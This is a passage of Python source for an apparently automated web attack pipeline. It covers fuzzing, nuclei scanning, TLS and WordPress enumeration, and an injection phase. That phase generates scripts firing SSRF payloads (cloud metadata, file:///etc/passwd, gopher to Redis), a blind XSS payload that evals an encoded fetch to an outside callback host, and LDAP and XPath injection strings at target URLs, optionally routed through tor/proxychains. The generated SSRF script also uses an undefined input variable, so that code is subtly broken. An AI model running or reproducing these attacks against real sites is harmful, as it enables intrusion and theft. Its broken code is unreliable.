    # Dedupe by (host, path) so URLs differing only in query params
    # don't all get fuzzed independently — saves significant time.
    deduped = _dedupe_by_host_path(all_urls)
    _FFUF_MAX_URLS = 20  # Hard cap: 20 URLs × 2 jobs = 40 max concurrent ffuf
    sample = deduped[:min(_PIPELINE_CFG.sample_urls_fuzz, _FFUF_MAX_URLS)]
    _proxy_opt = []
    if _PIPELINE_CFG.proxy:
        _proxy_opt = ["-x", _PIPELINE_CFG.proxy]
    # When operating over proxychains/tor, use smaller wordlists and
    # shorter timeouts — each request is ~1-5s vs ~50ms on a direct link.
    _is_slow_network = _USE_PROXYCHAINS
    _ffuf_timeout = 1200 if _is_slow_network else 3000
    _ffuf_ext_timeout = 600 if _is_slow_network else 600
    _seclists_base = Path(os.environ.get("SECLISTS", "/usr/share/seclists"))
    wordlist = os.environ.get(
        "FFUF_WORDLIST",
        (
            str(_seclists_base / "Discovery/Web-Content/common.txt")
            if _is_slow_network
            else str(_seclists_base / "Discovery/Web-Content/raft-medium-directories.txt")
        ),
    )
    if not Path(wordlist).exists():
        wordlist = ""
    jobs: List[Tuple[str, List[str], int]] = []
    if not wordlist or not Path(wordlist).exists():
        alt = sorted(_seclists_base.glob("Discovery/Web-Content/common.txt"))
        if not alt:
            alt = sorted(_seclists_base.glob("Discovery/Web-Content/*.txt"))
        if alt:
            wordlist = str(alt[0])
    if not wordlist or not Path(wordlist).exists():
        log("warn", f"08-FUZZ: no wordlist found (searched {_seclists_base}), ffuf disabled")
        wordlist = ""
    if t.has("ffuf") and wordlist:
        for u in sample:
            parsed_u = urllib.parse.urlparse(u)
            base_url = urllib.parse.urlunparse((
                parsed_u.scheme, parsed_u.netloc,
                parsed_u.path.rstrip("/"), None, None, None,
            ))
            out_json = _ffuf_dir / f"ffuf_{safe_suffix(u)}.json"
            jobs.append(
                (
                    f"ffuf-{_safe_name(u)}",
                    [
                        "ffuf", "-s", "-ac",
                        "-u", base_url + "/FUZZ",
                        "-w", wordlist,
                        "-mc", "200,301,302,403",
                        "-o", str(out_json),
                    ] + _proxy_opt + _extra_http_args() + _rate_limit_args("ffuf"),
                    _ffuf_timeout,
                )
            )
        # Extension fuzzing pass — find .php, .json, .bak, .old, .swp files
        # using a lightweight wordlist (common.txt) with the -e flag.
        ext_wordlist = os.environ.get(
            "FFUF_EXT_WORDLIST",
            str(_seclists_base / "Discovery/Web-Content/common.txt"),
        )
        if Path(ext_wordlist).exists():
            for u in sample:
                parsed_u = urllib.parse.urlparse(u)
                base_url = urllib.parse.urlunparse((
                    parsed_u.scheme, parsed_u.netloc,
                    parsed_u.path.rstrip("/"), None, None, None,
                ))
                out_json = _ffuf_dir / f"ffuf_ext_{safe_suffix(u)}.json"
                jobs.append(
                    (
                        f"ffuf-ext-{_safe_name(u)}",
                        [
                            "ffuf", "-s", "-ac",
                            "-u", base_url + "/FUZZ",
                            "-w", ext_wordlist,
                            "-e", ".php,.json,.bak,.old,.swp,.txt,.xml,.tar.gz,.zip",
                            "-mc", "200,301,302,403",
                            "-o", str(out_json),
                        ] + _proxy_opt + _extra_http_args() + _rate_limit_args("ffuf"),
                        _ffuf_ext_timeout,
                    )
                )

    if jobs:
        for old in _ffuf_dir.glob("ffuf_*.txt"):
            old.unlink(missing_ok=True)
        log("info", f"08-FUZZ: starting {len(jobs)} ffuf jobs")
        await run_parallel(jobs, outdir, quiet=True)
        log("info", f"08-FUZZ: {len(jobs)} ffuf jobs finished")
        normalized: List[Path] = []
        for ffp in _ffuf_dir.glob("ffuf_*.json"):
            norm = ffp.with_suffix(".txt")
            ensure(norm).write_text("\n".join(_extract_urls_from_ffuf_json(ffp)) + "\n")
            normalized.append(norm)
        n = merge_unique(normalized, outdir / "fuzz.txt")
        for p in _ffuf_dir.glob("ffuf_*.json"):
            p.unlink(missing_ok=True)
        if n == 0:
            log("warn", "08-FUZZ: fuzzers produced no hits")
        return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": n}
    log("info", "08-FUZZ: ffuf not available or no wordlist; keeping prior fuzz results")
    return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": count_nonblank(_f_out)}


async def phase_09_VULNSCAN(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"09-VULNSCAN"}:
        return {}
    _f1_out = outdir / "nuclei_combined.txt"
    if _f1_out.exists() and not force:
        return {"09-VULNSCAN": str(_f1_out), "count": count_nonblank(_f1_out)}
    log("info", "Phase 09-VULNSCAN: nuclei (full) + tech-scanner")
    hosts = outdir / "host_targets.txt"
    if not hosts.exists() or not read_lines(hosts):
        raw_hosts = outdir / "hosts.txt"
        if raw_hosts.exists() and read_lines(raw_hosts):
            _write_target_tokens(raw_hosts, hosts)
    if not hosts.exists() or not read_lines(hosts):
        hosts = outdir / "resolved.txt"
    if not hosts.exists() or not read_lines(hosts):
        log("warn", "09-VULNSCAN: no hosts; skipping")
        return {"09-VULNSCAN": str(outdir / "nuclei_combined.txt"), "count": 0}
    jobs: List[Tuple[str, List[str], int]] = []
    _proxy_opt = []
    if _PIPELINE_CFG.proxy:
        _proxy_opt = ["-proxy", _PIPELINE_CFG.proxy]
    if t.has("nuclei"):
        nuclei_base = [
            "nuclei", "-silent", "-l", str(hosts),
            "-timeout", "30", "-max-host-error", "10",
            "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ] + _extra_http_args()
        if _PIPELINE_CFG.rate_limit:
            nuclei_base += ["-rl", str(_PIPELINE_CFG.rate_limit)]
        # Bulk-size: process multiple templates per host for faster scans
        nuclei_base += ["-bs", "25"]
        # Tags: prefer cves, exposures for high-signal findings; exclude
        # info-severity templates that add noise on large targets.
        nuclei_tags = ["cves", "exposures", "misconfig", "vulnerabilities"]
        if _PIPELINE_CFG.nuclei_exclude_tags:
            nuclei_base += ["-et", _PIPELINE_CFG.nuclei_exclude_tags]
        jobs.append(
            (
                "nuclei-cves",
                nuclei_base
                + ["-tags", ",".join(nuclei_tags), "-severity", "low,medium,high,critical",
                   "-o", str(outdir / "nuclei.txt")]
                + _proxy_opt,
                3600,
            )
        )
        # Headless scan for DOM-based / client-side issues (needs nuclei with
        # headless engine — silently skipped if unsupported).
        _has_browser = any(
            shutil.which(b) for b in
            ("google-chrome", "chromium-browser", "chromium", "chrome", "google-chrome-stable")
        )
        if _has_browser:
            jobs.append(
                (
                    "nuclei-headless",
                    nuclei_base
                    + ["-headless", "-ho", "--headless=new,--no-sandbox,--disable-gpu", "-tags", "headless", "-severity", "medium,high,critical",
                       "-o", str(outdir / "nuclei_headless.txt")]
                    + _proxy_opt,
                    3600,
                )
            )
        else:
            log("info", "nuclei-headless: no Chrome/Chromium found; skipping")
        # tech-scanner uses the same nuclei binary; do not double-gate on httpx.
        jobs.append(
            (
                "tech-scanner",
                nuclei_base
                + ["-t", "http/technologies",
                   "-o", str(outdir / "tech.txt")]
                + _proxy_opt,
                3600,
            )
        )
    await run_parallel(jobs, outdir)
    n = merge_unique(
        [outdir / "nuclei.txt", outdir / "nuclei_headless.txt", outdir / "tech.txt"],
        outdir / "nuclei_combined.txt",
    )
    comb = outdir / "nuclei_combined.txt"
    if comb.exists():
        lines = read_lines(comb)
        deduped: List[str] = []
        waf_seen: Set[str] = set()
        for ln in lines:
            if "waf-detect" in ln:
                parts2 = ln.strip().split()
                host_part = parts2[-1] if parts2 else ""
                host_part = host_part.replace("http://", "").replace("https://", "")
                norm = f"waf-detect:{host_part}"
                if norm in waf_seen:
                    continue
                waf_seen.add(norm)
            deduped.append(ln)
        if len(deduped) != len(lines):
            comb.write_text("\n".join(deduped) + "\n")
            n = len(deduped)
    return {"09-VULNSCAN": str(outdir / "nuclei_combined.txt"), "count": n}


async def phase_10_TLSCMS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"10-TLSCMS"}:
        return {}
    _f2_out = outdir / "tls_wp.txt"
    if _f2_out.exists() and not force:
        return {"10-TLSCMS": str(_f2_out), "count": count_nonblank(_f2_out)}
    log("info", "Phase 10-TLSCMS: testssl + wpscan")
    hosts = outdir / "host_targets.txt"
    if not hosts.exists() or not read_lines(hosts):
        raw_hosts = outdir / "hosts.txt"
        if raw_hosts.exists() and read_lines(raw_hosts):
            _write_target_tokens(raw_hosts, hosts)
    if not hosts.exists() or not read_lines(hosts):
        hosts = outdir / "resolved.txt"
    if not hosts.exists() or not read_lines(hosts):
        log("warn", "10-TLSCMS: no hosts; skipping")
        return {"10-TLSCMS": str(outdir / "tls_wp.txt"), "count": 0}
    sample = read_lines(hosts)[:_PIPELINE_CFG.sample_hosts_ssl]
    testssl_bin = "testssl.sh" if t.has("testssl.sh") else ("testssl" if t.has("testssl") else None)
    # testssl: write PER-HOST files via a runner (no shared `>>` file ⇒ no race).
    # The Python TLS fallback below works correctly over proxychains (Python's
    # socket module is hooked by LD_PRELOAD) unlike testssl.sh's /dev/tcp.
    testssl_jobs: List[Tuple[str, List[str], int]] = []
    if testssl_bin:
        # Lightweight pre-check: skip hosts behind Cloudflare (testssl exits 254 on those)
        _cf_skip = set()
        for h in sample:
            try:
                _host = h.split("/")[2] if "://" in h else h.split(":")[0]
                _req = urllib.request.Request(f"https://{_host}", method="HEAD")
                _req.add_header("User-Agent", "Mozilla/5.0")
                _resp = urllib.request.urlopen(_req, timeout=5)
                _srv = _resp.headers.get("Server", "")
                if "cloudflare" in _srv.lower() or "cf-ray" in _resp.headers:
                    _cf_skip.add(h)
                    log("info", f"10-TLSCMS: {h} is behind Cloudflare; skipping testssl")
            except Exception:
                pass
        for h in sample:
            if h in _cf_skip:
                continue
            per_host = outdir / f"testssl_{safe_suffix(h)}.txt"
            runner = outdir / "logs" / f"testssl_{safe_suffix(h)}.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"OUT={shlex.quote(str(per_host))}\n"
                f"H={shlex.quote(h)}\n"
                f"BIN={shlex.quote(testssl_bin)}\n"
                '# testssl expects a bare hostname, not a URL — strip scheme\n'
                'HOST=$(echo "$H" | sed "s|^https\\?://||" | sed "s| .*$||" | sed "s|/.*$||")\n'
                '"$BIN" --quiet --color 0 "$HOST" > "$OUT" 2>&1 || true\n'
            )
            runner.chmod(0o700)
            testssl_jobs.append((f"testssl-{_safe_name(h)}", ["bash", str(runner)], 3600))
    # Python TLS fallback (works with proxychains, unlike testssl.sh's /dev/tcp)
    tls_script = outdir / "tls_check.py"
    tls_script.write_text(
        "#!/usr/bin/env python3\n"
        '"""Minimal TLS check that works through proxychains."""\n'
        "import json, ssl, socket, sys, urllib.parse\n"
        "from pathlib import Path\n"
        "HOSTS = " + json.dumps(sample) + "\n"
        "OUTDIR = " + json.dumps(str(outdir)) + "\n"
        'for h in HOSTS:\n'
        '    if h.startswith(("http://", "https://")):\n'
        '        try:\n'
        '            parsed = urllib.parse.urlparse(h)\n'
        '            host = parsed.hostname\n'
        '            port = parsed.port or 443\n'
        '        except Exception:\n'
        '            host = h.split("/")[2] if "://" in h else h.split(":")[0]\n'
        '            port = 443\n'
        '    else:\n'
        '        host = h.split(":")[0]\n'
        '        port = int(h.split(":")[1]) if ":" in h and h.split(":")[1].isdigit() else 443\n'
        '    safe = host.replace(".", "_").replace(":", "_")\n'
        '    out = Path(OUTDIR) / f"testssl_py_{safe}.txt"\n'
        '    try:\n'
        '        ctx = ssl.create_default_context()\n'
        '        ctx.check_hostname = True\n'
        '        ctx.verify_mode = ssl.CERT_REQUIRED\n'
        '        with socket.create_connection((host, port), timeout=15) as sock:\n'
        '            with ctx.wrap_socket(sock, server_hostname=host) as ssock:\n'
        '                ver = ssock.version()\n'
        '                cipher = ssock.cipher()\n'
        '                cert = ssock.getpeercert()\n'
        '                cn = next((v for part in cert.get("subject", []) for k, v in part if k == "commonName"), "")\n'
        '                san = [v for _, v in cert.get("subjectAltName", [])]\n'
        '                out.write_text(f"{h} | TLS {ver} | cipher={cipher[0]} | CN={cn} | SAN={san}\\n")\n'
        '    except Exception as e:\n'
        '        out.write_text(f"{h} | ERROR: {e}\\n")\n'
    )
    tls_script.chmod(0o700)
    testssl_jobs.append(("tls-check", ["python3", str(tls_script)], 300))
    # wpscan writes per-host files natively via --output.
    # Skip if the host doesn't appear to be WordPress (check multiple indicators).
    _f2_urlopen = _get_urlopener()
    wpscan_jobs: List[Tuple[str, List[str], int]] = []
    if t.has("wpscan"):
        for h in sample:
            if not h.startswith(("http://", "https://")):
                continue
            # Quick pre-check: is this WordPress? Check multiple paths + homepage body
            # to reduce false negatives from hardened / hidden wp-login.php.
            wp_found = False
            for wp_path in ("/wp-login.php", "/wp-content/", "/wp-includes/"):
                try:
                    req = urllib.request.Request(h.rstrip("/") + wp_path, method="HEAD")
                    wp_status, _, _ = await _async_urlopen(_f2_urlopen, req, timeout=10)
                    if wp_status in (200, 301, 302, 403, 401):
                        wp_found = True
                        break
                except Exception:
                    continue
            if not wp_found:
                # Check homepage body for WordPress markers
                try:
                    req = urllib.request.Request(h, method="GET", headers={"User-Agent": "Mozilla/5.0"})
                    _, _, wp_body_bytes = await _async_urlopen(_f2_urlopen, req, timeout=10)
                    body = wp_body_bytes.decode("utf-8", errors="ignore").lower()
                    if "wp-content" in body or "wordpress" in body:
                        wp_found = True
                except Exception:
                    pass
            if not wp_found:
                continue
            wps_out = outdir / f"wpscan_{safe_suffix(h)}.txt"
            wpscan_cmd = ["wpscan", "--url", h, "--no-banner",
                           "--enumerate", "vp,vt,tt,cb,dbe,u,ap,at",
                           "--output", str(wps_out)]
            if _PIPELINE_CFG.proxy:
                wpscan_cmd.extend(["--proxy", _PIPELINE_CFG.proxy])
            _wps_cookie = os.environ.get("COOKIE", "")
            if _wps_cookie:
                wpscan_cmd.extend(["--cookie", _wps_cookie])
            _wps_headers = os.environ.get("EXTRA_HEADERS", "")
            if _wps_headers:
                for hdr in _wps_headers.split("\n"):
                    hdr = hdr.strip()
                    if hdr:
                        wpscan_cmd.extend(["--header", hdr])
            # WPSCAN_API_TOKEN is read from the environment by wpscan natively,
            # so we do NOT pass it on the CLI to avoid credential exposure via ps.
            wpscan_jobs.append(
                (
                    f"wpscan-{_safe_name(h)}",
                    wpscan_cmd,
                    1800,
                )
            )
    # Clean up stale per-host files from prior runs BEFORE launching new jobs
    # to prevent old artifacts from being re-incorporated into the merge.
    for p in outdir.glob("testssl_*.txt"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("testssl_py_*.txt"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("wpscan_*.txt"):
        p.unlink(missing_ok=True)
    # run both groups in parallel; per-host files remove the race
    await run_parallel(testssl_jobs + wpscan_jobs, outdir)
    n = merge_unique(
        list(outdir.glob("testssl_*.txt")) + list(outdir.glob("testssl_py_*.txt")) + list(outdir.glob("wpscan_*.txt")),
        outdir / "tls_wp.txt",
    )
    # Strip proxychains noise lines that pollute tool output
    tls_wp = outdir / "tls_wp.txt"
    if tls_wp.exists():
        clean = [ln for ln in read_lines(tls_wp) if not ln.startswith("[proxychains]")]
        if len(clean) != n:
            tls_wp.write_text("\n".join(clean) + "\n")
            n = len(clean)
    tls_script.unlink(missing_ok=True)
    return {"10-TLSCMS": str(tls_wp), "count": n}


async def phase_11_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, oast_domain: Optional[str], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"11-INJECT"}:
        return {}
    _g_out = outdir / "vulns.txt"
    if _g_out.exists() and not force:
        return {"11-INJECT": str(_g_out), "count": count_nonblank(_g_out)}
    log("info", "Phase 11-INJECT: dalfox → sqlmap → SSRF probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "11-INJECT: no URLs; skipping")
        return {"11-INJECT": str(outdir / "vulns.txt"), "count": 0}
    all_urls = _dedupe_by_host_params(all_urls)
    all_urls = _dedupe_by_normalized_url(all_urls)
    if oast_domain:
        os.environ["COLLABORATOR"] = oast_domain
    jobs: List[Tuple[str, List[str], int]] = []
    xss_urls = [u for u in all_urls if "=" in u]
    xss_in = ensure(outdir / "urls_xss.txt")
    if xss_urls:
        xss_in.write_text("\n".join(xss_urls) + "\n")
    if xss_urls and t.has("dalfox"):
        # Run pre-filtering tools (kxss, Gxss) BEFORE dalfox since dalfox
        # reads their output files.
        prefilter_jobs: List[Tuple[str, List[str], int]] = []
        kxss_out = outdir / "urls_xss_reflected.txt"
        if t.has("kxss"):
            prefilter_jobs.append((
                "kxss",
                ["kxss", "-l", str(xss_in), "-o", str(kxss_out)],
                600,
            ))
        gxss_out = outdir / "urls_xss_gxss.txt"
        if t.has("Gxss"):
            prefilter_jobs.append((
                "Gxss",
                ["bash", "-c", f"Gxss -o {shlex.quote(str(gxss_out))} < {shlex.quote(str(xss_in))}"],
                600,
            ))
        if prefilter_jobs:
            await run_parallel(prefilter_jobs, outdir)
        # Use Gxss output as dalfox input if kxss is not available
        dalfox_in = (gxss_out if t.has("Gxss") and not t.has("kxss") else
                     kxss_out if t.has("kxss") else xss_in)
        dalfox_cmd = [
            "dalfox", "file", str(dalfox_in), "-S",
            "--output", str(outdir / "xss.txt"),
            "--delay", "500",
            "--no-spinner",
            "--user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "--only-custom-payload",
        ]
        if _PIPELINE_CFG.proxy:
            dalfox_cmd.extend(["--proxy", _PIPELINE_CFG.proxy])
        _dlf_cookie = os.environ.get("COOKIE", "")
        if _dlf_cookie:
            dalfox_cmd.extend(["--cookie", _dlf_cookie])
        _dlf_headers = os.environ.get("EXTRA_HEADERS", "")
        if _dlf_headers:
            for hdr in _dlf_headers.split("\n"):
                hdr = hdr.strip()
                if hdr:
                    dalfox_cmd.extend(["--header", hdr])
        jobs.append(("dalfox", dalfox_cmd, 3600))
    ssrf_urls = [
        u
        for u in all_urls
        if any(k in u.lower() for k in (
            "url=", "uri=", "path=", "dest=", "redirect=", "img=",
            "target=", "site=", "view=", "domain=", "feed=", "host=",
            "to=", "out=", "callback=", "load=", "fetch=", "proxy=",
            "image=", "img_url=", "picture=", "return=", "returnurl=",
            "next=", "continue=", "goto=", "forward=", "port=",
            "endpoint=", "svc=", "api=",
        ))
    ]
    ssrf_in = ensure(outdir / "urls_ssrf.txt")
    if ssrf_urls:
        ssrf_in.write_text("\n".join(ssrf_urls) + "\n")
    # Validate OAST hostname is a single safe token (alnum, dot, dash only)
    # BEFORE splicing it into a script. shlex.quote is belt-and-suspenders.
    if oast_domain and ssrf_urls and _SAFE_HOST.match(oast_domain):
        ssrf_script = outdir / "ssrf_probe.py"
        ssrf_script.write_text(
            "#!/usr/bin/env python3\n"
            '"""SSRF probe: rewrite URL parameters to point at OAST listener and internal targets."""\n'
            "import os, random, sys, urllib.request, urllib.parse, socket\n"
            "_proxy = os.environ.get('PROXY', '')\n"
            "_urlopen = urllib.request.urlopen\n"
            "if _proxy:\n"
            "    if _proxy.startswith(('http://', 'https://')):\n"
            "        _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
            "        _urlopen = urllib.request.build_opener(_handler).open\n"
            "    elif _proxy.startswith(('socks4://', 'socks5://', 'socks5h://', 'socks4a://')):\n"
            "        try:\n"
            "            import socks as _socks\n"
            "            _parsed = urllib.parse.urlparse(_proxy)\n"
            "            _pt = _socks.SOCKS5 if _parsed.scheme.startswith('socks5') else _socks.SOCKS4\n"
            "            _socks.set_default_proxy(_pt, _parsed.hostname, _parsed.port or 1080)\n"
            "            _socks.wrap_module(socket)\n"
            "        except ImportError:\n"
            "            pass\n"
            f"OAST = {json.dumps(oast_domain)}\n"
            "assert __import__('re').match(r'^[A-Za-z0-9.-]+$', OAST), 'OAST domain contains unsafe characters'\n"
            "SSRF_PARAMS = {\n"
            "    'url', 'uri', 'path', 'dest', 'redirect', 'img', 'target', 'site',\n"
            "    'view', 'domain', 'feed', 'host', 'to', 'out', 'callback', 'load',\n"
            "    'fetch', 'proxy', 'image', 'img_url', 'picture', 'return', 'returnurl',\n"
            "    'next', 'continue', 'goto', 'forward', 'port', 'endpoint', 'svc', 'api',\n"
            "}\n"
            "INTERNAL_TARGETS = [\n"
            "    f'http://{OAST}/ssrf-{{i}}',\n"
            "    'http://169.254.169.254/latest/meta-data/',\n"
            "    'http://[::1]/',\n"
            "    'http://127.0.0.1:8080/',\n"
            "    'http://127.0.0.1:80/',\n"
            "    'http://0.0.0.0:80/',\n"
            "    'http://localhost:80/',\n"
            "    'file:///etc/passwd',\n"
            "    'gopher://127.0.0.1:6379/_',\n"
            "    'dict://127.0.0.1:6379/info',\n"
            "]\n"
            "import uuid\n"
            "with open(IN) as f:\n"
            "    for line in f:\n"
            "        url = line.strip()\n"
            "        if not url:\n"
            "            continue\n"
            "        # Fire a direct HTTP probe to OAST as a ping (independent of param injection)\n"
            "        try:\n"
            "            ping_url = f'http://{OAST}/ssrf-ping/' + uuid.uuid4().hex[:12]\n"
            "            _urlopen(urllib.request.Request(ping_url, method='GET',\n"
            "                headers={'User-Agent': 'Mozilla/5.0'}), timeout=10)\n"
            "        except Exception:\n"
            "            pass\n"
            "        parsed = urllib.parse.urlparse(url)\n"
            "        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)\n"
            "        for param in SSRF_PARAMS:\n"
            "            if param in qs:\n"
            "                for target in INTERNAL_TARGETS:\n"
            "                    test_qs = qs.copy()\n"
            "                    test_qs[param] = [target.format(i=random.randint(0, 99999))]\n"
            "                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)\n"
            "                    new_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))\n"
            "                    try:\n"
            "                        req = urllib.request.Request(new_url, method='GET',\n"
            "                            headers={'User-Agent': 'Mozilla/5.0'})\n"
            "                        _urlopen(req, timeout=10)\n"
            "                    except Exception:\n"
            "                        pass\n"
        )
        ssrf_script.chmod(0o700)
        jobs.append(("ssrf-probe", ["python3", str(ssrf_script)], 600))
        # Blind XSS — inject a header that will callback to OAST when rendered server-side
        blind_xss_in = ensure(outdir / "urls_xss_blind.txt")
        blind_xss_urls = xss_urls[:_PIPELINE_CFG.sample_urls_xss_blind]
        if blind_xss_urls and oast_domain and _SAFE_HOST.match(oast_domain):
            blind_xss_in.write_text("\n".join(blind_xss_urls) + "\n")
            blind_script = outdir / "blind_xss_probe.py"
            _xss_b64 = base64.b64encode(f"fetch('http://{oast_domain}/blind=xss')".encode()).decode()
            blind_script.write_text(
                "#!/usr/bin/env python3\n"
                '"""Blind XSS probe: Fire requests with XSS payloads that call back to OAST."""\n'
                "import os, sys, urllib.request, socket\n"
                "_proxy = os.environ.get('PROXY', '')\n"
                "_urlopen = urllib.request.urlopen\n"
                "if _proxy:\n"
                "    if _proxy.startswith(('http://', 'https://')):\n"
                "        _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
                "        _urlopen = urllib.request.build_opener(_handler).open\n"
                "    elif _proxy.startswith(('socks4://', 'socks5://', 'socks5h://', 'socks4a://')):\n"
                "        try:\n"
                "            import socks as _socks\n"
                "            _parsed = urllib.parse.urlparse(_proxy)\n"
                "            _pt = _socks.SOCKS5 if _parsed.scheme.startswith('socks5') else _socks.SOCKS4\n"
                "            _socks.set_default_proxy(_pt, _parsed.hostname, _parsed.port or 1080)\n"
                "            _socks.wrap_module(socket)\n"
                "        except ImportError:\n"
                "            pass\n"
                f"OAST = {json.dumps(oast_domain)}\n"
                "assert __import__('re').match(r'^[A-Za-z0-9.-]+$', OAST), 'OAST domain contains unsafe characters'\n"
                f"IN = {json.dumps(str(blind_xss_in))}\n"
                f'import os; PAYLOAD = os.environ.get("BLIND_XSS_PAYLOAD") or f\'"><img src=x onerror=eval(atob("{_xss_b64}"))>\'\n'
                "PAYLOAD2 = f'\\'-prompt`{OAST}`-\\''\n"
                "with open(IN) as f:\n"
                "    for line in f:\n"
                "        url = line.strip()\n"
                "        if not url or '=' not in url:\n"
                "            continue\n"
                "        try:\n"
                "            req = urllib.request.Request(url, method='GET',\n"
                "                headers={'User-Agent': PAYLOAD,\n"
                "                        'Referer': PAYLOAD2,\n"
                "                        'X-Forwarded-For': PAYLOAD})\n"
                "            _urlopen(req, timeout=10)\n"
                "        except Exception:\n"
                "            pass\n"
            )
            blind_script.chmod(0o700)
            jobs.append(("blind-xss-probe", ["python3", str(blind_script)], 300))
    elif oast_domain and ssrf_urls:
        log("warn", "11-INJECT: interactsh domain has unsafe characters, skipping SSRF probes")
    await run_parallel(jobs, outdir)
    # LDAP injection probes on param-bearing URLs
    ldap_findings: List[str] = []
    _ld_urlopen = _get_urlopener()
    _ld_extra_headers = _extra_headers_dict()
    ldap_urls = [
        u for u in all_urls if "=" in u and not _is_static_url(u)
    ][:_PIPELINE_CFG.sample_urls_ldap]
    _LDAP_PAYLOADS = ["*", "*)", "*)(uid=*))", "admin*", "*|uid=*", "*)(|(uid=*", "admin(*)"]
    _LDAP_SPECIFIC_INDICATORS = [
        "javax.naming", "ldapexception", "ldap_error", "invalid dn syntax",
        "ldap_no_such_object", "operationserror", "invalidcredentials",
        "ldap_result_entry", "com.sun.jndi.ldap",
    ]
    _LDAP_GENERIC_BASELINE = {"error", "syntax", "malformed"}
    async def _probe_ldap(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        baseline_lower = ""
        try:
            base_req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
            _, _, base_bytes = await _async_urlopen(_ld_urlopen, base_req, timeout=8)
            baseline_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            return results
        for pname in qs:
            if pname.lower() in _SKIP_PARAMS:
                continue
            for payload in _LDAP_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
                    _, _, body_bytes = await _async_urlopen(_ld_urlopen, req, timeout=8)
                    body = body_bytes.decode("utf-8", errors="ignore").lower()
                    if any(ind in body for ind in _LDAP_SPECIFIC_INDICATORS):
                        results.append(f"[ldap-candidate] {test_url} param={pname} payload={payload}")
                        break
                    generic_new = {w for w in _LDAP_GENERIC_BASELINE if w in body and w not in baseline_lower}
                    if generic_new:
                        results.append(f"[ldap-candidate-generic] {test_url} param={pname} payload={payload} keywords={generic_new}")
                        break
                except Exception:
                    continue
        return results
    ldap_results = await asyncio.gather(*[_probe_ldap(u) for u in ldap_urls])
    for lr in ldap_results:
        ldap_findings.extend(lr)
    if ldap_findings:
        ensure(outdir / "ldap_injection.txt").write_text("\n".join(ldap_findings) + "\n")
    # XPath injection probes on param-bearing URLs
    xpath_findings: List[str] = []
    _XPATH_PAYLOADS = ["' or '1'='1", "' and '1'='2", "' or 1=1 or '", "'] | //* | //*['"]
    _XPATH_INDICATORS = [
        "xpathexception", "system.xml.xpath", "microsoft.xpath", "saxon",
        "xpathevalerror", "domxpath", "xpathdocument", "xpathnavigator",
        "xpath exception", "xpath error",
    ]
    async def _probe_xpath(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        baseline_lower = ""
        try:
            base_req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
            _, _, base_bytes = await _async_urlopen(_ld_urlopen, base_req, timeout=8)
            baseline_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            return results
        for pname in qs:
            if pname.lower() in _SKIP_PARAMS:
                continue
            for payload in _XPATH_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
                    _, _, xp_body_bytes = await _async_urlopen(_ld_urlopen, req, timeout=8)
                    xp_body = xp_body_bytes.decode("utf-8", errors="ignore").lower()
                    if any(ind in xp_body for ind in _XPATH_INDICATORS):
                        results.append(f"[xpath-candidate] {test_url} param={pname} payload={payload}")
                        break
                except Exception:
                    continue
        return results
    xpath_results = await asyncio.gather(*[_probe_xpath(u) for u in ldap_urls])
    for xr in xpath_results:
        xpath_findings.extend(xr)
    if xpath_findings:
        ensure(outdir / "xpath_injection.txt").write_text("\n".join(xpath_findings) + "\n")
    parts = [outdir / "xss.txt", outdir / "sqlmap_findings.txt",
             outdir / "ldap_injection.txt", outdir / "xpath_injection.txt"]
    n = merge_unique([p for p in parts if p.exists()], outdir / "vulns.txt")
    return {"11-INJECT": str(outdir / "vulns.txt"), "count": n}


async def phase_11a_DOMXSS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"11a-DOMXSS"}:
        return {}
    _out = outdir / "domxss_findings.txt"
    if _out.exists() and not force:
        return {"11a-DOMXSS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 11a-DOMXSS: DOM-based XSS detection via browser automation")
    findings: List[str] = []
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "11a-DOMXSS: no URLs available; skipping")
